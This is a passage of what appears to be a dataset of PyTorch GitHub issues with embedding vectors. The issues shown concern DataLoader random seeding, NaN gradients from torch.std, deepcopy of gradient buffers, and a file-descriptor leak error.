#
#
#    10   2208  15203      0  15930  26024
#    11   2798  13264      0  17685  22011
#    12    528  11714      0  12927  24688
#    13   8541  11773      0  15240  29607
#    14   7144  14655      0  18374  24573
#    15   2329  12544      0  15192  27908
#    16    423  15892      0  18504  23111
#    17   9476  17389      0  19924  23799
#    18   3427  12458      0  12895  23201
#    19   6526  14935      0  15768  20789
#[torch.LongTensor of size 10x6]
```

The second and fifth columns are np.random generated random numbers in Dataset and Transform. However, they are always that the same for different batches. This will make random data augmentation actually ""not random"".

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @SsnL @VitalyFedyunin @ejguan @pbelevich",True,"[-0.41719973 -0.29776084 -0.1896807  -0.31331754  0.3683067  -0.20167574
  0.21928424  0.32621503 -0.19634043  0.23693612 -0.13622236  0.02896385
  0.51048946  0.2812798  -0.24392536  0.00278113 -0.34949845  0.00470959
 -0.01358444  0.26288325  0.42756182 -0.12173649  0.03785772 -0.01247246
  0.06742954 -0.08211666  0.1554892  -0.17297801 -0.17785344 -0.13901418
  0.18493426  0.3257371  -0.15281934 -0.00412199 -0.08333125  0.10268281
 -0.40826017 -0.13441193 -0.05865072  0.23093414  0.28709093  0.00886627
  0.07087192  0.11827552 -0.22771394  0.30224803 -0.25061476  0.60142404
 -0.12028037  0.255085   -0.03609952  0.02233905 -0.21740195 -0.53786784
 -0.09006552 -0.26122704 -0.0606299  -0.46065086 -0.00296827  0.17767479
 -0.04315301  0.04384565  0.20251924  0.17503297  0.26865453 -0.01339315
  0.02948722 -0.00531946  0.43811983 -0.43475762  0.20260486  0.41323447
  0.03138776 -0.02945894 -0.0426217   0.10721028 -0.3767817   0.0354746
 -0.15262905 -0.03450048 -0.36609912  0.02578988 -0.0053778  -0.49233878
 -0.02831512  0.04440144  0.47363245  0.13036996  0.4305196   0.12689345
  0.33753976  0.34130645 -0.13784859  0.15533963  0.04153048  0.6280284
  0.06393628 -0.43791163  0.01264869 -0.12505257  0.02702325 -0.35901397
 -0.21610013  0.18085298  0.15739264 -0.3102708  -0.25730112 -0.37621945
  0.00981771  0.28752926 -0.26238218  0.2657299   0.24081591  0.03968271
 -0.12141986  0.13543206 -0.07408458  0.1467425  -0.20127766  0.23375341
 -0.03217622 -0.01135521  0.06483738 -0.07380475  0.25300705  0.09027447
  0.02456356 -0.08920738  0.03621385  0.02323541  0.34219462  0.16566184
 -0.4088063   0.12402411 -0.20314044 -0.0791924  -0.23902974 -0.04845163
 -0.33357546  0.14449395  0.02646782  0.42830777 -0.23981258 -0.30518305
  0.06823404  0.10341664  0.21587425  0.15246558 -0.07409917  0.00436606
  0.04007344 -0.06269823 -0.24953371  0.22104037 -0.12473085  0.04244743
  0.4864705   0.04128182  0.41206822 -0.05245166 -0.20292544  0.48186633
  0.29389137  0.12603572  0.27054513  0.0929849  -0.06646258  0.09125391
 -0.18382351  0.08553448  0.21657053 -0.07878856 -0.40592065 -0.33967915
  0.30283043 -0.25413674 -0.3177114  -0.48305225 -0.09304595 -0.17969882
  0.1168547   0.12685484 -0.24165535  0.12089255 -0.19671905 -0.23985133
  0.10555748 -0.1748256  -0.13387504 -0.11824558 -0.19478153  0.04761394
  0.71349883  0.02594719  0.01307086 -0.36774427  0.5049216   0.29840145
  0.5350335   0.02334789 -0.20832653 -0.06544112  0.11711724  0.19335434
  0.13442488  0.09176138 -0.1896533  -0.11599007  0.04092905  0.13588646
 -0.7605466  -0.6536081   0.05787475  0.05000638 -0.4584119   0.2687053
 -0.17962484 -0.03814636  0.40480307 -0.15642284  0.28908134 -0.18888326
 -0.15378013 -0.1858226  -0.113693    0.00688539  0.04324519  0.29360735
  0.31667295 -0.12205009  0.00918163 -0.092584   -0.22485274  0.24010108
 -0.32348382 -0.12462886  0.26487768  0.14179155  0.25971264 -0.1760208
  0.05777258  0.18310583  0.2503831  -0.15797    -0.17068702  0.11271922
 -0.30448008 -0.008637    0.01702181 -0.19477083 -0.47482064  0.20395002
  0.2248525  -0.1741342   0.11303358  0.2689409  -0.12308417  0.0018207
  0.22056508 -0.31257173  0.15807393  0.3353152   0.18715475  0.31290245
 -0.12604678 -0.13653788 -0.28037253 -0.00413795  0.24498925 -0.34694222
  0.20940678  0.01619669  0.42137212  0.21958074 -0.02326913  0.14583823
  0.04736927 -0.22374436  0.09923629 -0.0277873  -0.2707873   0.16468756
  0.40455016  0.3059485  -0.24112625 -0.10860476 -0.11199043 -0.13301352
 -0.50238645  0.11610593 -0.0757536  -0.03153335  0.22801432 -0.15764132
  0.0771776   0.18838952  0.08975374 -0.55355275 -0.16082451 -0.13821939
  0.37618852  0.2818087   0.35355031 -0.11464999 -0.01825114  0.05974429
  0.24521205  0.17291087  0.06298569 -0.3070621   0.48409724 -0.21827209
  0.03861519  0.1330775  -0.4204422  -0.09141546 -0.12803277  0.31504625
  0.25018254  0.19802758 -0.11350854 -0.41815314 -0.03988446  0.3522761
  0.35871106 -0.00298172 -0.21065347  0.19216856  0.08639896 -0.01812147
  0.36429757 -0.05204265  0.15189293  0.19237894  0.25415957  0.02105133
 -0.2756477   0.2671361   0.01223571 -0.21999614  0.05681003 -0.4659717
  0.02180979 -0.36992806 -0.11624444  0.00192272  0.1467543   0.04681081
 -0.09711361 -0.020125   -0.1671786  -0.40699783 -0.14441283  0.00288794
 -0.29232684  0.22466204 -0.1042568  -0.1765536  -0.10200725  0.22880921
 -0.18888125 -0.03637556 -0.28737244 -0.08126052 -0.2704802  -0.35329387
 -0.11707228 -0.22309041 -0.07069212  0.09485659 -0.25910014  0.32812756
  0.29008645  0.30353266  0.31771335 -0.04200151 -0.03169016 -0.1322001
  0.1465329   0.21128222 -0.13312438 -0.11552056 -0.20898697 -0.29143435]"
torch.std NaN gradient todo module: bc-breaking module: autograd triaged module: NaNs and Infs actionable,"`torch.std(x)` gives NaN gradients at `x=0`.

```py
import torch
from torch.autograd.variable import Variable
import torch.nn.functional as F

a = Variable(torch.FloatTensor(16,3,64,64).zero_(),requires_grad=True)

# b = a.std(dim=0).mean()  # NaN gradients
# b = (a - a.mean(dim=0,keepdim=True)).norm(p=2,dim=0).mean() / (15**0.5)  # 0 gradients

b.backward()

print(a.grad.data)
```

related #2421 #3264


cc @ezyang @SsnL @albanD @zou3519 @gqchen @gchanan",True,"[-0.44775134  0.09290438 -0.04907408 -0.12242503  0.02411505 -0.10558359
 -0.13382718  0.27249467 -0.58183444  0.18171313 -0.11627592 -0.16365476
 -0.1772512   0.35945302 -0.11155769  0.13021007 -0.46998546 -0.06902629
 -0.01859195 -0.17277192  0.34418735 -0.09795068  0.11060518 -0.00609979
  0.08435661  0.34261504  0.11069126 -0.23150995  0.43759468 -0.08991335
 -0.20240486 -0.25352627 -0.30920768  0.15078336  0.10362005  0.11122103
 -0.2234112  -0.09096476 -0.04905264 -0.10991874 -0.03537599  0.14622363
  0.00691458 -0.0625668   0.17066291  0.10098436  0.09943035  0.21767259
 -0.19564623 -0.2628029   0.08368431  0.03230976 -0.15817188 -0.02366376
 -0.03771738 -0.11991691  0.08442263 -0.18190464  0.1827673  -0.3708791
  0.04830049  0.01383547  0.10006848 -0.07620616  0.12073816 -0.20274153
  0.05404922 -0.07065316  0.25834224 -0.11791188 -0.09441948 -0.1788294
 -0.20091812 -0.06444649  0.10626837 -0.08671788 -0.12573749  0.12420945
 -0.27670458 -0.16258177  0.03663199  0.0400907   0.02157549 -0.04067123
  0.03156863 -0.01311614  0.15759927 -0.09572499  0.46939993  0.6631521
 -0.00469425 -0.06554009 -0.3162633   0.20875874  0.01444258 -0.10858146
  0.11862801 -0.29491308  0.03507061 -0.15755472 -0.15181163 -0.31042075
 -0.364181    0.11110123  0.2550922   0.04418451  0.14069757  0.37698397
  0.24844965 -0.08661114 -0.06672683  0.05705534  0.04771963 -0.16038245
 -0.20830707 -0.04428699 -0.30327484 -0.10090337 -0.1902472   0.44084972
 -0.04438104  0.33732605  0.28309608  0.32308325  0.17003566 -0.09739387
  0.00543629 -0.06131197  0.04990668 -0.07671493  0.03311465 -0.01977396
 -0.05391382  0.05076674  0.3340135   0.30855182 -0.23359343 -0.19393237
 -0.08924395 -0.11703958 -0.48528776  0.11730003 -0.20236252 -0.36090708
  0.22823651 -0.4253279  -0.2007221   0.16931587 -0.02447256 -0.2323532
  0.15990108 -0.09397306 -0.41638863  0.07457893  0.3458212   0.16632524
  0.3289501  -0.00582721  0.18400374 -0.25865972  0.26190358  0.11958539
  0.33586913  0.03741618  0.44068414  0.12327193 -0.14209354  0.02620346
 -0.47342345  0.14959088  0.21302962  0.15355706 -0.03200203  0.03594675
  0.50376004 -0.34898257 -0.32345885 -0.3422678  -0.27542824  0.31928062
  0.17302069  0.23248363  0.28793257 -0.14891644  0.21085781  0.1552485
  0.15485299  0.00813088 -0.28594548  0.2771288  -0.12629367 -0.30402535
 -0.04152367 -0.0450388  -0.13978869  0.13560742 -0.03966129 -0.14592746
 -0.16428475 -0.08282888 -0.02211512 -0.11220817  0.09366418  0.15925202
 -0.06245682 -0.13012865 -0.28832307 -0.37296498 -0.6279267   0.2970675
  0.11771139 -0.33118516 -0.22953127 -0.18373956  0.06275141  0.04064976
  0.2700621  -0.4327844   0.12340119  0.06878208  0.2865091  -0.04099777
  0.10974042 -0.11333138  0.10082567  0.1001577  -0.28256732  0.05454002
 -0.14120905 -0.149106   -0.06376489 -0.24287689  0.33859897 -0.06222846
  0.16519943  0.27801928 -0.06438313 -0.00878613 -0.09262422 -0.10905643
  0.07802016  0.1256303   0.23076618  0.04499744 -0.05777551  0.41046402
 -0.3910919  -0.10641863 -0.06477648  0.04988274 -0.26964188  0.31558982
 -0.04533936  0.10027488  0.3982095  -0.09003151 -0.15933108 -0.13713264
 -0.26645628 -0.16982976 -0.12842089  0.28022552  0.03698364  0.17131923
  0.30917457 -0.27958557 -0.18025535  0.01025934 -0.14571756 -0.03646123
 -0.02266418 -0.2500378   0.5493501   0.219957    0.21513626 -0.04338808
  0.2665227  -0.10402569 -0.06572602 -0.36563912  0.04883811  0.35339758
 -0.05770074  0.23344578  0.2228652  -0.21686633  0.2744794  -0.12681459
 -0.24779384 -0.1940282   0.00828115 -0.0120017   0.60946655 -0.07052787
  0.01390363  0.10104327  0.15599188 -0.12834716 -0.02547553 -0.14012188
  0.109209    0.47798362  0.45430923 -0.2668943  -0.02388741 -0.03338028
  0.37100163  0.07556754  0.33204314 -0.49481344  0.25392586 -0.16368213
 -0.16695875  0.2827564  -0.06153142  0.00168426  0.04514958  0.13067341
  0.2976059   0.05164383 -0.03405876 -0.2558594  -0.15495628  0.022436
  0.00752719  0.09290861 -0.22769989  0.05394185  0.1048827  -0.17228615
  0.23050734  0.13111606  0.32940084  0.29462862 -0.0140711  -0.08576648
 -0.16396405  0.57078123 -0.07242821 -0.17740743 -0.364782   -0.09296514
  0.1525232  -0.16630523 -0.17089547 -0.01594505  0.1697008  -0.06347351
 -0.04718352 -0.12256403 -0.06595927  0.04910859  0.03710708  0.22382852
  0.3528655   0.47910523 -0.17467722 -0.1869203  -0.09864613  0.39654893
 -0.01967645  0.09589361 -0.32105213 -0.23346293 -0.32119673 -0.02509876
  0.15056118  0.00599786 -0.13126516  0.33547112  0.16396028  0.10931952
 -0.22214976  0.2429415   0.61999226 -0.24016413  0.08236619 -0.19774449
 -0.15846531  0.01080568 -0.12408322  0.17184737 -0.06527049 -0.23580265]"
`copy.deepcopy` does not copy gradient buffers of `torch.autograd.Variable` instance high priority module: bc-breaking module: autograd triaged,"I ran into unexpected behaviour with `copy.deepcopy` applied to a `Variable`. The gradient buffer of the `Variable` is not copied.
```
a = torch.autograd.Variable(torch.ones(1))
a.grad = torch.autograd.Variable(torch.ones(1))
b = copy.deepcopy(a)
print(b.grad)
```
I think it would be a good idea to copy the gradient buffer during a deep copy. My use case is recording the gradient of a model's parameter space for optimization research. This would also be useful for debugging/development of complex models that involve atypical gradient operations.

This is handled here: https://github.com/pytorch/pytorch/blob/5760b036fb338eacd641418321f23aee51b1aee9/torch/autograd/variable.py#L89-L97

A solution would be to also copy the `grad` attribute of the current `Variable`, which would involve a recursion of the deep copy since the grad attribute is also a `Variable`.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @albanD @gqchen @pearu @nikitaved @soulitzer @SsnL",True,"[-3.23967218e-01 -2.16282263e-01 -1.97647363e-01 -4.02521230e-02
  1.56747758e-01 -6.48364425e-02 -8.26081932e-02  1.79508552e-01
 -3.04478675e-01 -9.84406322e-02 -1.64861828e-01 -6.43022656e-02
 -5.43256700e-02  2.39757285e-01 -1.32758886e-01  1.44767880e-01
 -1.30810142e-01 -1.55563399e-01 -9.76827741e-03 -2.20630631e-01
  4.38829437e-02 -1.62965417e-01  8.49571973e-02  1.84474841e-01
  1.73901953e-02  1.76550075e-01  7.80964047e-02 -3.21468234e-01
  3.26606035e-01 -9.55602527e-02 -2.57505476e-01 -3.45440298e-01
 -3.17994654e-01 -8.91399756e-03  3.02789658e-01  1.63792342e-01
 -3.54132563e-01 -2.05395510e-03 -1.82656407e-01 -1.52540594e-01
  2.92554200e-01  4.14059870e-02  4.94052470e-02 -5.35674095e-02
  1.41384259e-01 -1.26399577e-01 -1.67381406e-01  1.01567715e-01
 -3.33590508e-01 -2.29025651e-02  7.19430819e-02  8.96348134e-02
 -5.07442176e-01 -9.09382179e-02 -3.70402485e-01  6.53693378e-02
  5.76761030e-02 -1.34323746e-01  2.81642616e-01 -3.04791927e-01
 -8.64836425e-02  8.03276449e-02 -1.08507127e-01  1.74983442e-01
  7.04252124e-02 -2.46566400e-01  9.81306881e-02  2.03003496e-01
  4.09301907e-01  1.04697850e-02 -4.96185236e-02 -1.02872513e-01
 -6.41082972e-02 -2.02975616e-01  2.14696020e-01 -1.92028955e-01
 -3.03541362e-01  6.31956905e-02 -2.23398700e-01 -3.60890895e-01
  2.82355607e-01 -7.34664425e-02 -3.03448029e-02 -5.40990233e-02
  4.95942831e-02  1.00371584e-01  4.16219950e-01 -9.88949239e-02
  7.75500834e-02  4.85755265e-01  1.93825066e-01 -2.56545156e-01
  1.10517964e-01  4.28008646e-01 -6.63167750e-03  4.61634137e-02
  5.43870069e-02 -2.86350876e-01  1.96467310e-01 -3.09806108e-01
 -4.28938344e-02 -2.39937067e-01  1.24833524e-01  1.37325406e-01
  3.21011454e-01 -6.73885643e-02 -3.16217095e-02  2.96329796e-01
  2.08627567e-01 -1.61326215e-01 -1.80572331e-01  2.96368301e-01
  1.99058831e-01 -3.51942539e-01  3.66175175e-02 -1.21295154e-01
 -2.37365752e-01 -5.82205877e-02 -4.04832333e-01  1.56664476e-01
 -2.99429670e-02  5.18025532e-02  1.98151469e-01  1.10350728e-01
  2.42155015e-01 -1.54597126e-02 -1.00406613e-02  1.94780771e-02
  2.33381361e-01 -2.60986507e-01 -1.51783414e-02  1.37412488e-01
 -1.08764626e-01 -1.02884404e-01  3.59358311e-01  2.71231264e-01
 -5.06824136e-01 -5.46919778e-02 -7.26250326e-03 -2.37429589e-01
 -1.21264994e-01  2.19909638e-01 -3.76732290e-01  1.28037706e-02
 -2.28116274e-01  2.22802721e-03 -2.57529140e-01  1.70974240e-01
 -2.19938651e-01 -1.66713260e-03 -2.24751001e-03 -3.45103681e-01
 -4.83635843e-01 -1.81422204e-01  2.21160471e-01  1.64198548e-01
  2.45088264e-02  1.90940022e-01  2.81270534e-01 -1.04211144e-01
  3.68438736e-02  1.51388437e-01  1.68405384e-01 -9.40073729e-02
  3.81178588e-01  6.60904944e-02  4.71824110e-02  6.59414530e-02
 -2.97586828e-01  9.95052084e-02  1.01786807e-01 -2.12603658e-01
  1.07062951e-01 -3.08465242e-01  8.51934701e-02 -2.91002123e-03
 -1.24068279e-02 -2.50553071e-01 -1.46935973e-02  1.61102802e-01
  1.90886021e-01  1.53330520e-01 -1.31704584e-01  8.74908939e-02
  3.26219022e-01  9.37125087e-02  2.82871246e-01 -2.45719943e-02
 -8.71164650e-02  3.67929041e-01 -2.54489034e-01 -2.21979827e-01
  1.64994657e-01  2.04721808e-01 -1.39753902e-02  8.04025456e-02
 -9.33904760e-03 -4.24057901e-01 -1.51267096e-01 -2.40870371e-01
 -1.48854300e-01 -2.36301273e-02  1.69828221e-01 -1.01240851e-01
  4.18069996e-02  1.24470226e-01 -5.65501511e-01 -2.02435374e-01
 -3.12475860e-01  1.37333572e-01  1.45200882e-02 -2.26300120e-01
 -3.05524647e-01 -1.82854995e-01 -6.29523993e-02 -9.29232836e-02
  4.82786074e-02 -3.63050494e-04  8.55260938e-02  1.10055611e-01
  3.32064211e-01  1.61562264e-01  3.92409146e-01 -1.63308829e-01
  2.19306067e-01  1.00995801e-01 -1.15951356e-02  1.81197569e-01
  7.44043812e-02  7.55736139e-04  7.83686154e-03 -2.00620264e-01
 -2.51860134e-02  1.34138867e-01  4.36711647e-02  3.33667040e-01
  1.92192435e-01 -4.23226729e-02 -9.31868330e-02  3.05991843e-02
  1.19698495e-01 -1.10100033e-02 -1.93938851e-01 -1.09275291e-02
 -6.97500110e-02  2.66545378e-02 -1.56667456e-01 -1.99673455e-02
 -1.20689869e-01 -1.05024055e-01 -5.44821203e-01  3.49135339e-01
  7.37771764e-02 -4.74947058e-02  3.28555226e-01  1.70648575e-01
 -3.25821757e-01 -1.74987569e-01 -2.08834801e-02 -1.69646814e-01
  2.33563110e-01  2.58293480e-01 -7.99830258e-03  5.90659827e-02
  1.54825091e-01 -2.01017886e-01  4.43488099e-02 -2.63894379e-01
  1.89034328e-01 -5.89785539e-02  1.16614714e-01 -4.44039345e-01
  3.23580325e-01  4.88071084e-01  1.20752536e-01  2.29971051e-01
  1.21423453e-01  2.80703008e-01  1.12852007e-01  1.64348017e-02
  3.34181011e-01  4.03133750e-01 -2.26110116e-01  3.01253021e-01
  2.10669160e-01 -1.31958321e-01  1.87011555e-01 -7.90387243e-02
 -1.86818868e-01 -2.70043522e-01  1.62178159e-01 -5.53211570e-02
  3.76791894e-01 -5.71414381e-02  1.14823446e-01  2.33953953e-01
  2.54305333e-01 -2.61883169e-01  1.97963446e-01 -3.71378176e-02
 -7.17224255e-02 -2.86598876e-02  8.19797963e-02 -8.45138170e-03
 -7.83305336e-03 -7.04879314e-02  3.36862504e-01  2.66385287e-01
  1.60507888e-01 -4.55220044e-01  4.34085011e-01 -1.86803252e-01
 -1.18144780e-01 -1.57194018e-01 -1.30082458e-01  1.04389332e-01
  4.40307036e-02 -9.53296646e-02  1.62313998e-01  1.39861461e-02
 -1.43875241e-01 -3.19298133e-02 -6.24359101e-02  2.49783814e-01
 -2.72938907e-01  1.08874589e-02 -2.81203955e-01  2.02546969e-01
  1.38098840e-02 -2.93862782e-02  4.01247069e-02 -3.47511470e-02
  1.31281033e-01  3.51329893e-01 -1.76655620e-01 -3.62566084e-01
 -2.95080274e-01  3.52590144e-01  9.32617560e-02 -2.10765213e-01
 -1.82319701e-01 -2.53848851e-01  1.79760158e-01 -3.41193043e-02
 -4.88921553e-02 -8.68085027e-02  4.17113528e-02  1.77312791e-01
 -1.56606864e-02 -2.25840107e-01  5.11707962e-02 -6.51348159e-02
 -8.12171325e-02  4.29223105e-02  2.92798579e-01  3.95584524e-01
  2.58566082e-01  6.20841831e-02 -9.39269513e-02  4.38226759e-01
  5.57007641e-02 -2.53639847e-01 -1.27934456e-01 -6.22434430e-02
  6.28782809e-03  5.35893068e-02 -8.91406387e-02 -2.60884687e-02
  4.17517200e-02  2.88883626e-01  1.73626810e-01 -5.99238873e-02
 -7.21765757e-02  4.34596241e-02  5.90356410e-01 -4.06299122e-02
  1.57885551e-02 -2.03444943e-01  2.04646841e-01 -3.28423865e-02
 -1.90150648e-01  2.94176668e-01  4.75684553e-03 -1.31980658e-01]"
"file_descriptor sharing strategy may be leaking FDs, resulting in DataLoader causing `RuntimeError: received 0 items of ancdata` high priority module: crash module: dataloader triaged has workaround","**Editorial note:** If you are having this problem, try running `torch.multiprocessing.set_sharing_strategy('file_system')` right after your import of torch

----

I am using a `DataLoader` in my code with a custom `Dataset` class, and it worked fine during training for several epochs. However, when testing my model, after a bit less than 1k iterations, I'm getting the following error:

```
RuntimeError                              Traceback (most recent call last)
/home/jfsantos/src/pytorch_models/test_model.py in <module>()
     82
     83 print('Generating samples...')
---> 84 for k, batch in tqdm(enumerate(test_loader)):
     85     f = G_test.audio_paths[k]
     86     spec, phase = spectrogram_from_file(f, window=window, step=step)

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/site-packages/tqdm/_tqdm.py in __iter__(self)
    831 """""", fp_write=getattr(self.fp, 'write', sys.stderr.write))
    832
--> 833             for obj in iterable:
    834                 yield obj
    835                 # Update and print the progressbar.

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/site-packages/torch/utils/data/dataloader.py in __next__(self)
    166         while True:
    167             assert (not self.shutdown and self.batches_outstanding > 0)
--> 168             idx, batch = self.data_queue.get()
    169             self.batches_outstanding -= 1
    170             if idx != self.rcvd_idx:

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/multiprocessing/queues.py in get(self)
    343             res = self._reader.recv_bytes()
    344         # unserialize the data after having released the lock
--> 345         return ForkingPickler.loads(res)
    346
    347     def put(self, obj):

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/site-packages/torch/multiprocessing/reductions.py in rebuild_storage_fd(cls, df, size)
     68         fd = multiprocessing.reduction.rebuild_handle(df)
     69     else:
---> 70         fd = df.detach()
     71     try:
     72         storage = storage_from_cache(cls, fd_id(fd))

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/multiprocessing/resource_sharer.py in detach(self)
     56             '''Get the fd.  This should only be called once.'''
     57             with _resource_sharer.get_connection(self._id) as conn:
---> 58                 return reduction.recv_handle(conn)
     59
     60

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/multiprocessing/reduction.py in recv_handle(conn)
    179         '''Receive a handle over a local connection.'''
    180         with socket.fromfd(conn.fileno(), socket.AF_UNIX, socket.SOCK_STREAM) as s:
--> 181             return recvfds(s, 1)[0]
    182
    183     def DupFd(fd):

/home/jfsantos/anaconda3/envs/pytorch/lib/python3.5/multiprocessing/reduction.py in recvfds(sock, size)
    158             if len(ancdata) != 1:
    159                 raise RuntimeError('received %d items of ancdata' %
--> 160                                    len(ancdata))
    161             cmsg_level, cmsg_type, cmsg_data = ancdata[0]
    162             if (cmsg_level == socket.SOL_SOCKET and

RuntimeError: received 0 items of ancdata
```

However, if I just do `idxs = [k for k, batch in tqdm(enumerate(test_loader))]` I do **not** have this issue.

I do not have any idea on how to test it as my knowledge of how PyTorch does this is currently very limited, but I could help debug this given some instructions. Does anyone have any idea on where I could start?",True,"[-2.09592834e-01 -5.45515656e-01 -2.86339045e-01 -7.83590078e-02
  1.34056091e-01 -1.61285520e-01 -2.09956408e-01 -5.53037077e-02
 -4.34121639e-01  7.12005943e-02 -1.06025919e-01 -2.79112220e-01
 -1.99944198e-01  1.88125312e-01 -6.72282875e-02  8.09558481e-02
  3.10489163e-03 -3.45269561e-01  1.24982208e-01 -7.03918710e-02
 -1.68672919e-01  5.82434721e-02 -2.48948373e-02 -5.85686266e-02
 -3.82401198e-02  3.14548254e-01 -4.40371260e-02 -1.21189155e-01
 -8.15900043e-02  6.38326444e-03  7.23726526e-02 -3.49770576e-01
 -3.75399053e-01  9.36251506e-02  2.25396246e-01  2.00942624e-02
 -4.59907740e-01 -7.45525658e-02 -1.29801422e-01 -3.43078822e-02
  1.64155364e-01  1.57646805e-01 -1.08874179e-02 -1.93118155e-02
 -4.56253558e-01  9.83358622e-02 -2.80627578e-01  1.54425144e-01
 -3.80578399e-01 -6.60999194e-02 -1.42301973e-02  1.43488050e-01
 -2.12705970e-01  4.35928889e-02 -4.98707443e-02 -1.56181574e-01
 -7.79156759e-02  1.58874393e-01  6.11233562e-02 -2.16514021e-02
  1.10357150e-01 -2.81139523e-01  4.51318249e-02 -1.60001934e-01
 -1.40251741e-02  4.26427163e-02 -2.11359710e-02  2.40658745e-01
  4.65015292e-01 -2.80782580e-01 -4.23248764e-03  1.25225112e-01
 -1.91075623e-01 -6.14648089e-02  3.10627390e-02  1.62729800e-01
 -2.59250909e-01  2.36931875e-01 -4.28691730e-02 -3.86521399e-01
 -5.85975051e-02  2.16131300e-01 -1.25949591e-01  5.40205389e-02
  6.01601526e-02 -2.45608285e-01  9.61692482e-02 -2.28243712e-02
  2.05853626e-01  1.79167330e-01  7.02936649e-02  2.30495483e-01
  2.33518004e-01  4.41709697e-01 -1.60985932e-01  2.74775028e-01
  1.06306691e-02  6.93735927e-02 -1.93709984e-01 -1.70658499e-01
 -1.54653952e-01 -4.15135711e-01 -1.85521215e-01  3.60090375e-01
 -3.37677188e-02 -1.61329836e-01  3.57864916e-01  4.10334349e-01
  6.60564899e-02 -1.59850180e-01  1.62241384e-02  9.94509608e-02
 -7.86900818e-02 -3.73447806e-01 -4.33217362e-03 -1.34068340e-01
 -3.17017198e-01  4.58134562e-02 -2.25676715e-01  1.24354139e-02
  2.18496263e-01 -1.18577123e-01 -5.74614368e-02 -3.14794034e-02
  5.20009875e-01 -1.64464600e-02  3.28942202e-02 -4.80260253e-02
  1.56028308e-02 -1.83842510e-01  7.20348805e-02  1.70924067e-01
 -7.81402215e-02 -2.05081224e-01  4.54746783e-01  5.05668402e-01
 -4.51727450e-01 -2.96565175e-01 -4.49644029e-02 -1.09081678e-01
  8.81258547e-02  1.07072651e-01  5.98327816e-03 -3.12389135e-01
  1.92276612e-01  1.58078998e-01  1.37123764e-01 -4.91493680e-02
  1.44278958e-01  1.90725639e-01  1.04902454e-01 -3.15243661e-01
 -1.79571569e-01  2.31961697e-01 -1.81598365e-02  8.63953903e-02
  4.87974316e-01  1.95475757e-01  4.68931615e-01 -2.61443019e-01
 -3.08539867e-02  1.49970829e-01  4.35912684e-02 -1.78017557e-01
 -7.68008549e-03  7.73004908e-03 -5.52146211e-02 -5.57301603e-02
 -1.97681457e-01  5.58921881e-03 -4.97500360e-01 -2.81208992e-01
 -1.83608472e-01 -3.07277620e-01  1.75868928e-01 -8.12191442e-02
 -1.26079261e-01 -2.84439206e-01 -7.43460804e-02 -3.66510823e-03
  4.12091494e-01  5.48175275e-01  1.47702903e-01  6.73475116e-02
  8.82117450e-02  2.42772792e-02  3.55683327e-01 -1.44134462e-01
  2.42249668e-03 -7.99512565e-02 -3.56643200e-01 -4.63156216e-02
  3.18754882e-01 -1.38581879e-02  2.06511676e-01 -1.00194559e-01
 -2.84283459e-02  1.14544602e-02  1.61532387e-02  4.79055904e-02
  2.25363225e-01  4.12209295e-02 -9.60248560e-02 -7.21059144e-02
 -4.76334542e-02  3.22201699e-02 -3.46182972e-01 -4.11766171e-01
 -1.18475065e-01 -1.58127293e-01 -4.91606951e-01 -7.75465891e-02
 -1.62617266e-01  5.14201224e-02 -7.71157369e-02 -6.20214231e-02
 -3.74837399e-01  3.82443249e-01  1.12408593e-01 -1.13960959e-01
  1.49639115e-01  8.16999972e-02  4.41540815e-02 -3.96095514e-01
  7.63681345e-03  3.25611770e-01 -1.30881727e-01  1.30498096e-01
  1.79831803e-01  2.23043635e-01 -3.02765481e-02 -2.87627429e-01
 -3.17499340e-02  4.56078351e-01 -4.55951601e-01  2.75480330e-01
  1.81280032e-01 -1.18258446e-01 -2.98415512e-01  8.89489204e-02
 -2.16883436e-01 -1.29808158e-01 -1.78765461e-01 -2.78443873e-01
 -1.05976403e-01  1.87798470e-01 -7.96556771e-02 -1.08629517e-01
 -8.04872513e-02  1.17934279e-01 -3.28567475e-01  6.16963543e-02
  1.91459864e-01 -7.70230666e-02  2.75673985e-01  3.25972229e-01
  1.58405006e-01 -3.92058074e-01  3.61676775e-02 -8.12658817e-02
 -1.19904384e-01  1.01304993e-01  6.32162839e-02  4.85606909e-01
  2.56547302e-01 -3.25626880e-02 -2.61789888e-01  1.05490960e-01
 -1.45069718e-01  1.12836212e-01 -9.21994969e-02 -1.49453655e-01
  4.25091743e-01  4.54328656e-01  2.49812663e-01 -1.13234401e-01
  2.13263065e-01  2.73684580e-02  2.09136814e-01  7.61069283e-02
  3.15987378e-01  3.21470559e-01 -1.64018393e-01  8.46386403e-02
  5.76613069e-01 -1.82107255e-01 -6.43554777e-02 -7.63133392e-02
 -5.88168055e-02 -8.27112272e-02  1.19115934e-01 -3.86345163e-02
  2.95121729e-01  2.56736502e-02 -3.13171804e-01 -2.42229626e-02
  2.39542067e-01 -8.44351947e-02  3.10223311e-01 -2.80453712e-02
 -1.37127951e-01 -2.61437476e-01 -8.42828751e-02  2.53372639e-01
 -2.71143407e-01 -6.64348453e-02  1.76308125e-01  1.06709301e-01
  4.29776579e-01 -3.43481600e-01  4.63769555e-01  8.01465586e-02
 -2.04049274e-01  1.60189658e-01 -1.55785844e-01  1.59631148e-02
  1.36101663e-01  2.10827634e-01  6.01135865e-02 -1.64615914e-01
  3.90546322e-02 -2.65356600e-01  3.41796502e-02  1.41599506e-01
  8.60931724e-02  7.11678863e-02 -2.50406444e-01  3.12122822e-01
  4.61805165e-02  4.44412768e-01  3.28023136e-01 -2.32503623e-01
  2.24281669e-01  8.33567381e-02 -8.77022594e-02 -2.38762736e-01
 -2.23357938e-02  1.54994845e-01 -1.36491418e-01 -1.38724819e-01
  5.45260608e-02  5.90138435e-02 -1.54182732e-01 -1.29907951e-02
  2.90364288e-02  7.46083558e-02  2.66609013e-01  4.70513761e-01
 -1.60723835e-01  4.11615558e-02  1.19497050e-02 -1.10935897e-01
  2.13060752e-01  6.68550059e-02 -1.15220472e-01  4.74665761e-01
  9.17070657e-02  3.68734002e-01  4.95288288e-04  2.97749281e-01
  1.04847467e-02  4.82089221e-01 -1.68799505e-01 -7.08683208e-02
